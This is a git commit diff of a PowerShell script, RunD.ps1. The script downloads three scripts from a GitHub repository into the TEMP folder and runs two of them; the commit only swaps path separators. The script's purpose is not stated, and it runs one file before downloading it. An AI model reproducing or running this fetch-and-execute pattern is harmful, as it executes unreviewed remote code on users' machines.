c1d209d28bd2cf77905b0da6178fc9bd00b996d4
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-10-20 18:55:11 +0700

    Update RunD.ps1

--- RunD.ps1
+++ RunD.ps1
@@ -1,13 +1,13 @@
 $url1 = "https://raw.githubusercontent.com/cia168168/folder/main/RunV/MyScript.ps1"
-$output1 = "$env:TEMP\MyScript.ps1"
+$output1 = "$env:TEMP/MyScript.ps1"
 & $output1
 Invoke-WebRequest -Uri $url1 -OutFile $output1
 Start-Sleep -Seconds 2
 $url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
-$output2 = "$env:TEMP\stop.ps1"
+$output2 = "$env:TEMP/stop.ps1"
 Invoke-WebRequest -Uri $url2 -OutFile $output2
 Start-Sleep -Seconds 1
 $url3 = "https://raw.githubusercontent.com/cia168168/folder/main/batt.ps1"
-$output3 = "$env:TEMP\batt.ps1"
+$output3 = "$env:TEMP/batt.ps1"
 Invoke-WebRequest -Uri $url3 -OutFile $output3
 & $output3
